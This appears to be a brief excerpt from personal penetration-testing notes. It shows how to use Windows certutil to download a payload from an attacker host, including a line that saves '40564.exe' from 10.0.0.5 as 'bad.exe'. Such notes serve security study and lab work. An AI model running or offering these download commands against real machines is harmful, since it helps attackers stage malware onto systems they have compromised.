-- -
#### Certutil
```powershell
# I don't think the -f is necessary
certutil -urlcache http://<attack ip>/<filepath> <output file>
certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe
```